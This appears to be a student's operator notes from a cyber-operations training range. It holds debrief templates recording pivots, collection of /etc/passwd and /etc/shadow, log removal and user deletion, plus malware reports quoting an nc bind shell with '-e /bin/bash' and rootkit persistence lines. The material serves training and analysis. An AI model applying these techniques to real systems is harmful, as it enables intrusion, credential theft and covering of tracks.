logging to file via gvfs is not standard.<br />*****End of Report*****<br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Debrief</h1><br/>***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: DryRun04<br />MC: MC2<br />Analyst: Analyst2                                                                                                                     <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted rsyslog, SELinux.  Redirected T2<br />T2:  Submitted privuser (administrator), logfusion. redirected T3 using netsh.<br />T3:  Submitted cetnOS.rtr, SElinux.  Redir to T4.<br />T4:  Submitted ProcAccounting, Selinux. Surveyed.  Redirect to T5.<br />T5:  Submitted privileged user (root), rcpdump, rsyslog. Surveyed. Collected 5 files.  Redirected to T6 via iptables.<br />T6:  Submitted nothing. Survey.  Collected files files.<br />T7:  Submitted  PrivUser Administrator), kasperski. Survey.<br />***** END OF REPORT***** <br /><br /><br /><br /><br /><br /><br /><br />DON’T FORGET TO REPORT ADMIN USERS IN DEBRIEF<br /><br />My TEMPLATE--&gt;<br />***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: Mystic Marvel 10<br />MC: MC1/2<br />Analyst: Analyst1/2                                                                                                                     <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted rsyslog, maldet security product, and SELinux report on T1 and conducted scan of network.  Redirected T2<br />T2:  Submitted rsyslog report and redirected T3 using IPtables.<br />T3:  Submitted rsyslog and SElinux report.  Collected /etc/passwd and /etc/shadow.<br />T4:  Submitted sfk keylogger malware and privileged user report. Collected user info and installed app info.  Redirect to T5 by netsh rules.<br />T5:  Submitted beacon.ps1 malware and privileged user report.  Collected .dll files.  Redirected to T6 via netsh rules.<br />T6:  Submitted Reptile rootkit and rsyslog reports.  Did survey.  Collected files from /etc.  Redirect to T7.<br />T7:  Submitted  rsyslog report. Completed survey.  T10 Effect: Deleted student1 from T7.<br />***** END OF REPORT <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />DON’T FORGET TO REPORT ADMIN USERS IN DEBRIEF<br /><br />My TEMPLATE--&gt;<br />***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: DryRun01<br />MC: MC1<br />Analyst: Analyst2                                                                                                                     <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted rsyslog, SELinux report. Conducted scan of network.  Redirected T2<br />T2:  Submitted rsyslog and selinux report and redirected T3.<br />T3:  Submitted rsyslog and SElinux and centOS.rtr.updtr report.  Scanned 192.168.117.0/24 network and Identified possible OS&#39;s. Redirected to T4.<br />T4:  Submitted selinux, lynis, rsyslog, clamav report. Conducted Survey.  Redirect to T5.<br />T5:  Submitted priv user report. Conducted Survey.  Redirected to T6. (admin user)<br />T6:  Submitted selinux, rsyslog reports.  Did survey.  Redirect to T7.<br />T7:  Submitted  no report. Completed survey. <br />***** END OF REPORT <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />DON’T FORGET TO REPORT ADMIN USERS IN DEBRIEF<br /><br />My TEMPLATE--&gt;<br />***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: Dry Run 03<br />MC: MC2<br />Analyst: Analyst2                                                                                                                     <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted selinux, rsyslog,   Redirected T2<br />T2:  Submitted selinux, rsyslog. Redir to T3.<br />T3:  Submitted centOS.rtr.updtr and SElinux report.  . Redir To T4.<br />T4:  Submitted Reptile, Priv User Reports. Collected log backups.  Redirect to T5, 6, and 7 via ssh.<br />T5:  Submitted file2.txt, file3.txt, maytheforcebewithyou.txt, rsyslog, tcpdump. Did Survey.Redir to T6.<br />T6:  Submitted selinux, maldet, priv user.  Did survey. Completed Misson.  <br />***** END OF REPORT <br /><br /><br />***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: DryRun04<br />MC: MC2<br />Analyst: Analyst2                                                                                                                     <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted rsyslog, SELinux.  Redirected T2<br />T2:  Submitted privuser (administrator), logfusion. redirected T3 using netsh.<br />T3:  Submitted cetnOS.rtr, SElinux.  Redir to T4.<br />T4:  Submitted ProcAccounting, Selinux. Surveyed.  Redirect to T5.<br />T5:  Submitted privileged user (root), rcpdump, rsyslog. Surveyed. Collected 5 files.  Redirected to T6 via iptables.<br />T6:  Submitted nothing. Survey.  Collected files files.<br />T7:  Submitted  PrivUser Administrator), kasperski. Survey.<br />***** END OF REPORT <br /><br /><br /><br /><br />***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: DryRun05<br />MC: MC1<br />Analyst: Analyst2                                                                                                                     <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted rsyslog, SELinux.  Redirected T2<br />T2:  Submitted rsyslog, SElinux. REdirected T3 and T5.<br />T3:  Submitted cetnOS.rtr, SElinux.  Redir to T4.<br />T4:  Submitted Lynis, ClamScan, SELinux. Surveyed.<br />T5:  Submitted CentOS.rtr, SeLinux.  Redirected to T6,7,8,9,10.<br />T6:  Submitted ProcAccounting, SeLinux. Surveyed.<br />T7:  Submitted  SeLinux. Survey. Collected File.<br />T8:  Submitted PrivUser, BitDefender, Script.ps1. Surveyed.<br />T9:  Submitted svchost (nc). Surveyed.<br />T10:Submitted PrivUser, Spyrix, avira, script.ps1. Survey. End Op.<br />***** END OF REPORT*****<br /><br /><br /><br /><br /><br /><br />***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: Eval01<br />MC: MC2<br />Analyst: Analyst2                                                                                                                     <br /><br />Description:<br />Failed to survey and Achieve access to all machines (krasnovians network degraded).<br /><br />T1:  Submitted rsyslog, SELinux.  Scaned T3&#39;s Network. Redirected T2,T3<br />T2:  Was not able to achieve access (krasnovian issue or bad intel).<br />T3:  Submitted AbLog. Scanning was not able to be completed due to network degration. End Op.<br />***** END OF REPORT***** <br /><br /><br /><br /><br />***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: Eval02<br />MC: MC1<br />Analyst: Analyst2                                                                                                                     <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted rsyslog, SELinux.  Redirected T2<br />T2:  Submitted privuser (administrator) Redir T3.<br />T3:  Submitted IpMonitor.  Redir to T4.<br />T4:  Submitted Lynix, clamav, SeLinux. Survey. Scan.  Redirect to T5 and T6.<br />T5:  Submitted hMailServer. Survey. Collected Files. Burn Off.<br />T6:  Submitted tcpdump, postdrop,sendmail,selinux.. Survey.  Collected files. Completed Mission.<br />***** END OF REPORT***** <br /><br /><br /><br /><br /><br /><br /><br />***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: Eval03<br />MC: MC2<br />Analyst: Analyst2                                                                                                                     <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted rsyslog, SELinux.  Redirected T2<br />T2:  Submitted privuser (administrator) redirected T3.<br />T3:  Submitted IPMonitor privuser.  Redir to T4.<br />T4:  Submitted lynis, clamav, SeLinux. No Survey. Collect FOI. Redirect to T5. and T7.<br />T5:  Submitted privileged user (admnistrator), T10 implant, query.. Surveyed.  Redirected to T6 via netsh.<br />T6:  Submitted selinux. Survey.  Collected FOI. BurnOff.<br />T7:  Submitted  nothng. Survey. T10 effect. Fin Mission.<br />***** END OF REPORT***** <br /><br /><br /><br /><br /><br /><br />***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: Eval04<br />MC: MC1<br />Analyst: Analyst2                                                                                                                     <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />LP:     Submitted PrivUser, gvfsd, koadic, watchdog. Ran koadic as post-exploitation shell handler.<br />T1:  Submitted PrivUser, rsyslog, selinux. Used as pivot for T2-5<br />T2:  Submitted privuser. Survey.<br />T3:  Submitted privuser, script.ps1. Survey.<br />T4:     Submitted PrivUser, MRT. Survey.<br />T5:     Submitted PrivUser, Script.ps1, MRT. Survey. Fin Mission.<br />***** END OF REPORT***** <br /><br /><br /><br /><br /><br />***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: Eval05<br />MC: MC2<br />Analyst: Analyst1                                                                                          <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted rsyslog, SELinux.  Redirected T2<br />T2:  Submitted privuser (administrator), mal (intruder). redirected T3. Removed Logs on exit.<br />T3:  Submitted IPMonitor.  Redir to T4.<br />T4:  Submitted ProcAccount, SeLinux. Survey. Scan. Redir T5, T6.<br />T5:  Submitted hMailServer, Comodo.. Surveyed. Collected Burnoff.<br />T6:  Submitted Selinux. Survey. UserCatalog. Collected. Concluded Misson.<br />***** END OF REPORT***** <br /><br /><br /><br />***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: Eval06<br />MC: MC2<br />Analyst: Analyst1                                                                                          <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted rsyslog, SELinux.  Redirected T2<br />T2:  Submitted privuser (administrator), LogFusion. redirected T3.<br />T3:  Submitted IPMonitor.  Redir to T4.<br />T4:  Submitted ProcAccount, SeLinux. Redir T5, T6, T7.<br />T5:  Submitted Prvuser (root), TCPDump, rsyslog. Surveyed. Cataloged. Burnoff.<br />T6:  Submitted Selinux, brootkit, rsyslog. Survey. UserCatalog. Burnoff.<br />T7:  Submitted Kasperski. Survey. UserCatalog. Conclude Missoin.<br />***** END OF REPORT***** <br /><br /><br /><br />***** MC DEBRIEF *****<br />Operator: Student14<br />Operation: Eval08<br />MC: MC2<br />Analyst: Analyst1                                                                                          <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted rsyslog, SELinux, PrivUser.  Redirected T2<br />T2:  Submitted privuser (administrator). redirected T3.<br />T3:  Submitted IPMonitor.  Redir to T4.<br />T4:  Submitted ProcAccount, SeLinux. Redir T5, T6, T7, T8.<br />T5:  Submitted Prvuser (radicle), TCPDump, rsyslog. No Survey.. Burnoff.<br />T6:  Submitted Selinux, brootkit, rkhunter. Survey. Burnoff.<br />T7:  Submitted PrivUser (administrator), Avira, script.psq. Survey. Burnoff.<br />T8:  Submitted rsyslog, SeLinux. Survey. Add user (T10). Conclude Operation.<br />***** END OF REPORT***** </div><div class='page'><h1 class='title level-4'>Malware</h1><br/>MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# and IP<br />Time:<br />Name:  <br />PID:  <br />PPID:  <br />User:  <br />Location of config file:  <br />Remote hostname or IP:  <br />Network connections:<br />Description:<br /><br />### NSDB extras ###<br />Process options:<br />Hash:<br />File type of malware &amp; supporting files:<br />Associated logs:<br />Location and lines of persistence:  <br />Identifiable text:<br />Any modules loaded by malware:<br />Recommendation on what to do:<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****MalwareReport*****<br />Target: T#5 and IP 10.145.117.16<br />Time: 2021/05/07 - 10:25<br />Name:  centOS.rtr.updtr<br />PID:  1687<br />PPID:  1<br />User:  root<br />Location of config file: na  <br />Remote hostname or IP:  na<br />Network connections: 41481 listening<br />Description: This appears to just be a listening nc with no execution arguments. NOTE: This hash is not identifed as nc via VirusTotal. I still belive this is a renamed nc binary<br /><br />### NSDB extras ###<br />Process options: /bin/centOS.rtr.updtr -nklvp 41481<br />Hash: fd48f372b0a814108d6624de07fb3ed5<br />File type of malware &amp; supporting files: ELF.<br />Associated logs: /etc/centOS.rtr.conf<br />Location and lines of persistence: NONE<br />Malware file and support files full paths:/bin/centOS.rtr.updtr<br />Open/established network connections:41481 listennig<br />Identifiable text: na<br />Any modules loaded by malware: na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 4 and IP 192.168.117.104<br />Time:2021/05/04 - 09:38<br />Name:  Reptile<br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: /Reptile/configs/defconfig<br />Remote hostname or IP:  na<br />Network connections: na<br />Description: Reptile is a known rootkit from GitHub. This could be the reason behind the root tty bash shell not showing in w.<br /><br />### NSDB extras ###<br />Process options: na<br />Hash: <a href="https://github.com/f0rb1dd3n/Reptile">https://github.com/f0rb1dd3n/Reptile</a><br />File type of malware &amp; supporting files: Uncompiled C and config (ml) files<br />Associated logs: na<br />Location and lines of persistence:  /etc/crontab   /Reptile/reptile_cmd tcp 666 hide<br />Malware file and support files full paths:/Reptile/*<br />Identifiable text: na<br />Any modules loaded by malware: na<br />Recommendation on what to do: CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 5 and IP 192.168.117.105<br />Time:2021/05/04 - 10:50<br />Name:  nmap.exe<br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: na  <br />Remote hostname or IP:  na<br />Network connections:na<br />Description:nmap is a network scanning tool.<br /><br />### NSDB extras ###<br />Process options:na<br />Hash:4327397f1854d452a8a4c8dc47767383<br />File type of malware &amp; supporting files:na<br />Associated logs:na<br />Location and lines of persistence:na  <br />Malware file and support files full paths:C:\nmap.exe<br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 6 and IP 192.168.117.106<br />Time:2021/05/04 - 11:41<br />Name:  nc<br />PID:  na<br />PPID:  na<br />User:  root<br />Location of config file: na  <br />Remote hostname or IP:  na<br />Network connections: listen on all ports 31337<br />Description: nc was tasked to listen on 31337 in the background. It is no longer running.<br /><br />### NSDB extras ###<br />Process options:na<br />Hash:e64c8abed7922d527786523a908215a2<br />File type of malware &amp; supporting files:elfx64<br />Associated logs:na<br />Location and lines of persistence: na <br />Malware file and support files full paths:/bin/nc<br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 10 and IP 192.169.117.207<br />Time:2021/05/07 - 12:10<br />Name:  SPKL.exe<br />PID:  7144<br />PPID:  2432<br />User:  administrator<br />Location of config file:   na<br />Remote hostname or IP:  na<br />Network connections: na<br />Description: SPKL is a keylogger by SPYRIX. SPKL kicks of spmm. SPKL appears to be an orphan process becasue it&#39;s parent no longer exists.<br /><br />### NSDB extras ###<br />Process options:na<br />Hash: 32 e1 a4 e5 62 03 3a 56 78 9a 77 de f6 0c 3c 98<br />File type of malware &amp; supporting files: pe<br />Associated logs: na (although there is a capability to remote log keystrokes there are no signs that this is the case here.)<br />Location and lines of persistence:  na<br />Malware file and support files full paths:&quot;C:\ProgramData\Security Monitor\{827D21CC-A22D-45D6-23CA-451DDAC769BA}\spkl.exe&quot; MD5<br />Identifiable text: na<br />Any modules loaded by malware: na<br />Recommendation on what to do: CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 7 and IP 192.168.117.107<br />Time: sfk.exe<br />Name:  swiss file knife<br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: na  <br />Remote hostname or IP:  na<br />Network connections: na<br />Description: SFK is a file managment tool. It is not running ATM.<br /><br />### NSDB extras ###<br />Process options:na<br />Hash: 0c fb c6 ae 15 2e 81 e6 57 ad 45 d0 21 f3 19 5f<br />File type of malware &amp; supporting files:pe<br />Associated logs:na<br />Location and lines of persistence:  hklm\software\microsoft\windows\currentversion\run<br />Malware file and support files full paths: C:\sfk.exe<br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 2 and IP 10.20.169.10<br />Time:2021/05/18 - 08:52<br />Name:  lf (LaunchOnFly<br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: na  <br />Remote hostname or IP:  na<br />Network connections:na<br />Description: Lf.exe is able to record keyboard and mouse input. It is not currently running.<br /><br />### NSDB extras ###<br />Process options: na<br />Hash: 9b3916f441304b39c0d4e4477437294f<br />File type of malware &amp; supporting files: pe<br />Associated logs:na<br />Location and lines of persistence:na  <br />Malware file and support files full paths:C:\lf.exe<br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 5 and IP 192.169.117.201<br />Time: 2021/05/05 - 11:21<br />Name: tcpdump  <br />PID:  21503<br />PPID:  21483<br />User:  root<br />Location of config file:  na<br />Remote hostname or IP:  na<br />Network connections: none show in netstat but the network is likley being sniffed on the local  interface.<br />Description:The network is likley being sniffed on the local interface.<br /><br />### NSDB extras ###<br />Process options: -i lo -w /var/log/tcpdump.pcap<br />Hash:.1c66774b21053d19a12d01a87a1b9c9e<br />File type of malware &amp; supporting files:x64 elf<br />Associated logs:/var/log/tcpdump.pcap <br />Location and lines of persistence:  na<br />Malware file and support files full paths:na<br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 2 and IP 10.145.117.10<br />Time: 2021/05/06 - 08:59<br />Name: password.txt<br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: C:\windows\system32<br />Remote hostname or IP: na <br />Network connections:na<br />Description: Txt file<br /><br />### NSDB extras ###<br />Process options:na<br />Hash: f089c0f820e4d17661e2c361490835cb<br />File type of malware &amp; supporting files: txt<br />Associated logs:na<br />Location and lines of persistence:na  <br />Malware file and support files full paths:C:\windows\system32<br />Identifiable text:na<br />Any modules loaded by malware:na <br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 7  and IP 192.186.169.144<br />Time: 2021/05/20 - 10:35<br />Name: script.ps1  <br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: C:\temp  <br />Remote hostname or IP:  https://git.cybbh.space/t10/public/-/raw/master/heat%2FNon_Standard_RepoOpenSSH-Win64.zip<br />Network connections: na<br />Description: Powershell script to Download\install openssh (and edit configs).<br /><br />### NSDB extras ###<br />Process options: na<br />Hash: 46 dd 9f e3 bf d4 ad 94 e9 bc 31 08 2a 9d ee 99<br />File type of malware &amp; supporting files: powershell<br />Associated logs:na<br />Location and lines of persistence: na  <br />Identifiable text: na<br />Any modules loaded by malware: na<br />Recommendation on what to do: CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 9 and IP 192.169.117.206<br />Time: 2021/05/07 - 11:48<br />Name: svchost (nc)  <br />PID:  21566<br />PPID:  1<br />User:  root<br />Location of config file: na  <br />Remote hostname or IP:  na<br />Network connections: listening on 31337<br />Description: VirusTotal matches the hash to nc. upon connection to this machine at 31337, a bash shell will be initiated.<br /><br />### NSDB extras ###<br />Process options: -nvlp 31337 -e /bin/bash<br />Hash:7a32c9739cc63ed983ae01af2577c01c<br />File type of malware &amp; supporting files: elfx64<br />Associated logs:na<br />Location and lines of persistence: na  <br />Identifiable text:na<br />Any modules loaded by malware: na<br />Recommendation on what to do: CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br />*****Malware Report*****<br />Target: T# 5 and IP 10.101.169.30<br />Time: 2021/05/11 - 11:22<br />Name: hMailServer.exe  <br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file:   c:\program files (x86)\hmailserver<br />Remote hostname or IP:  na<br />Network connections: na<br />Description: hmailserver.exe does not appear to be running. Not listening on any email ports.<br /><br />### NSDB extras ###<br />Process options: na<br />Hash: 0a7585129239412e4a7c16a7fec8b67a<br />File type of malware &amp; supporting files: c:\program files (x86)\hmailserver<br />Associated logs: c:\program files (x86)\hmailserver\Logs (non existant)<br />Location and lines of persistence:  na<br />Identifiable text: na<br />Any modules loaded by malware: na<br />Recommendation on what to do: CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br />*****Malware Report*****<br />Target: T#6 and IP 10.123.169.35<br />Time: 2021/05/11 - 12:32<br />Name: sendmail  <br />PID:  26539<br />PPID:  26535<br />User:  root<br />Location of config file: na  <br />Remote hostname or IP:  Listening on 25 (actually kicked owned by postfix)<br />Network connections: na<br />Description: sendmail running is not default and should never run as root.<br /><br />### NSDB extras ###<br />Process options: /usr/sbin/sendmail -FCronDaemon -i -odi -oem -oi -t -f root<br />Hash:dc50faaba9f6d6f0093e6151cf68598c<br />File type of malware &amp; supporting files: ELFx64<br />Associated logs: /var/log/maillog<br />Location and lines of persistence:  na (althought this process was kicked off by crond...)<br />Identifiable text: na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br />*****Malware Report*****<br />Target: T#5 and IP 192.168.169.111<br />Time: 2021/05/12 - 10:59<br />Name:  T10implant.exe<br />PID:  2816<br />PPID:   7812<br />User:  administrator<br />Location of config file:   C:\implant\T10implant.exe<br />Remote hostname or IP:  192.168.169.43<br />Network connections: Calls out to 192.168.169.43 on ports around 8000 <br />Description:Calls out to 192.168.169.43 on ports around 8000 and gives them code execution<br /><br />### NSDB extras ###<br />Process options:na<br />Hash:aed90e0732eb1ec90d8e5f9a7c2ff17d<br />File type of malware &amp; supporting files:pe<br />Associated logs:na<br />Location and lines of persistence:na  <br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br />*****Malware Report*****<br />Target: T#5 and IP192.168.169.111<br />Time:2021/05/12 - 11:06<br />Name:  query<br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file:na  <br />Remote hostname or IP:  na<br />Network connections:na<br />Description:probably query.exe moved out of system32<br /><br />### NSDB extras ###<br />Process options:na <br />Hash:fe82ab7377083bf03b81aded4cda9818<br />File type of malware &amp; supporting files:na<br />Associated logs:na<br />Location and lines of persistence:na  <br />Identifiable text:na<br />Any modules loaded by malware:na <br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br />*****Malware Report*****<br />Target: T# LP and IP 10.50.28.172<br />Time: 2021/05/13 - 08:55<br />Name: koadic  <br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: /koadic  <br />Remote hostname or IP:  na<br />Network connections:na<br />Description:koadic is a post exploitation toolkit.<br /><br />### NSDB extras ###<br />Process options:na <br />Hash:c1244790a38f18ad37ff1b79fa6ac774<br />File type of malware &amp; supporting files:/koadic<br />Associated logs:na<br />Location and lines of persistence:na  <br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br />*****Malware Report*****<br />Target: T# 2 and IP  140.20.169.13<br />Time: 2021/05/17 - 09:15<br />Name:  dir<br />PID:  na<br />PPID:  na<br />User:  administrator<br />Location of config file: C:\windows\WIN.INTRUDER.DOSKEY<br />Remote hostname or IP:  na<br />Network connections:na<br />Description:Any time you run dir.exe the logged in user is logged to C:\users\%USERNAME%\IntruderLog.txt as well as C:\intruder.txt. dir.exe appears to be mapped to a script that echos &quot;HELLO INTRUDER.&quot; There is no dir in system 32 or in any other directory in the %path%. There is no remapping of the term &quot;dir&quot; with variables&quot;. I suspect that there may be some ADS things going on to hide the actual script being run. There appears to be a scheduled task (possibly on another machine) to delete (or pull) the combined logs in c:\.<br /><br />### NSDB extras ###<br />Process options:na <br />Hash:c71934ab993219e5dc4aac800a6f2784<br />File type of malware &amp; supporting files: C:\windows\WIN.INTRUDER.DOSKEY<br />Associated logs:C:\users\%USER%\IntruderLog.txt, C:\intruderlog.txt, <br />Location and lines of persistence:  na<br />Identifiable text: Hello Intruder!<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />Sample Log OUtput: Unauthorized Access Detected; Intrusion Logged and Threat Detection Team Notified of User:<br />fileserver\caisson14<br /> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME<br /> administrator         console             1  Active      none   5/17/2021 12:16 PM<br /> <br /><br />*****End of Report*****<br /><br /><br />*****Malware Report*****<br />Target: T#6 and IP 192.168.69.201<br />Time: 2021/05/20 - 10:09<br />Name:  brootkit<br />PID:  491  <br />PPID:  1<br />User:  root<br />Location of config file: /usr/include/.../*  <br />Remote hostname or IP:  na<br />Network connections:na<br />Description: BROOTKIT is a Lightweight rootkit implemented using bash shell scripts v0.10<br /><br />### NSDB extras ###<br />Process options: /bin/bash /usr/include/.../bashbd.sh (sleep 75)<br />Hash: <a href="https://github.com/cloudsec/brootkit">https://github.com/cloudsec/brootkit</a><br />File type of malware &amp; supporting files: .sh<br />Associated logs: na<br />Location and lines of persistence: na  <br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****</div><div class='page'><h1 class='title level-4'>Privileged User</h1><br/>PRIVILEGED USER<br /><br />*****Privileged User Report*****<br />REPORT IN OPNOTES<br />Target:<br />IP:<br />Time:<br />Username:<br />Access Method:<br />Access Time:<br />Activity:<br />Network Connections:<br />Description:<br />Recommendation:<br />*****End of Report*****<br />REPORT WHAT THE USER IS DOING IN NOTES<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />PRIVILEGED USER<br /><br />*****Privileged User Report*****<br />REPORT IN OPNOTES<br />Target: T7<br />IP: 192.186.169.144<br />Time: 2021/05/20 - 10:26<br />Username: administrator<br />Access Method:Console<br />Access Time: 5/10/2021 3:36 PM<br />Activity: cmd, Avira.Systray.exe (standby for report), notepad.<br />Network Connections: na<br />Description:administrator appears to be sitting at an open cmd prompt and is running an antivirus.<br />Recommendation:CM<br />*****End of Report*****<br /><br /><br />tasklist -v | findstr -i administrator <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />PRIVILEGED USER<br /><br />*****Privileged User Report*****<br />REPORT IN OPNOTES<br />Target: T1<br />IP: 10.50.31.111<br />Time: 2021/05/20 - 11:51<br />Username: root<br />Access ss Time: 14:54<br />Activity: Bash<br />Running files/executables: na<br />Network Connections: <br />Description: The root user is logged in<br />Recommendation: CM<br />*****End of Report*****Method: tty <br />Access Time: 14:54<br />Activity: Bash<br />Running files/executables: na<br />Network Connections: <br />Description: The root user is logged in<br />Recommendation: CM<br />*****End of Report*****<br /><br /><br /><br /><br />****Privileged User Report****<br />REPORT IN OPNOTES<br />Target: T5<br />IP: 10.20.169.111<br />Time: 2021/05/12 - 10:21<br />Username: administrator<br />Access Method:console<br />Access Time: 2021/05/12 - 10:34<br />Activity: edge, T10implant.exe, powershell, msascuil.exe (winDefend interface), mmc, eventviewer, OLEMainThreadWndName, cmd, skype, RDP into 192.168.169.12 as user17.<br />Network Connections: na<br />Description:administrator appears to be consoled in and surfing the web aswell as periodically running C:\implant\T10implant.exe. RDP into 192.168.169.12 as user17.<br />Recommendation:CM<br />****End of Report****<br /><br /><br /><br /><br />*****Privileged User Report*****<br />REPORT IN OPNOTES<br />Target:lp<br />IP:10.50.27.67<br />Time:2021/05/13 - 08:38<br />Username:root<br />Access Method:tty<br />Access Time:11:50<br />Activity: none<br />Network Connections:na<br />Description:root is consoled in<br />Recommendation:CM<br />*****End of Report*****<br />REPORT WHAT THE USER IS DOING IN NOTES<br /><br /><br /><br /><br /><br />*****Privileged User Report*****<br />REPORT IN OPNOTES<br />Target:5<br />IP:192.186.169.201<br />Time:2021/05/20 - 09:38<br />Username:radicle<br />Access Method:tty1<br />Access Time:12:08<br />Activity: bash shell<br />Network Connections: na<br />Description:radicle may be a user that is logged in via tty sitting on a bash shell.<br />Recommendation:CM<br />*****End of Report*****</div><div class='page'><h1 class='title level-4'>Security Products</h1><br/>SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# and IP<br />Time: <br />Name:  <br />Version:  <br />Primary registry key / Config &amp; Installation location on *nix:<br /><br />### NSDB extras ###<br />Installation folder:  <br />Location of logs:<br />Timestamp of all associated log files:<br />SeMode: <br />Cloud based?  : <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do:  <br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T#8 and IP 192.186.169.142<br />Time: 2021/05/20 - 10:54<br />Name:  SELinux<br />Version:  31<br />Primary registry key / Config &amp; Installation location on *nix: /etc/selinux<br /><br />### NSDB extras ###<br />Installation folder:  /sys/fs/selinux<br />Location of logs: /var/<strong>log</strong>/audit/audit.log or /var/log/messages (/var/log/messages in this case)<br />SeMode: Permissive<br />Cloud based?  Y or N: NO<br />&gt;&gt;If 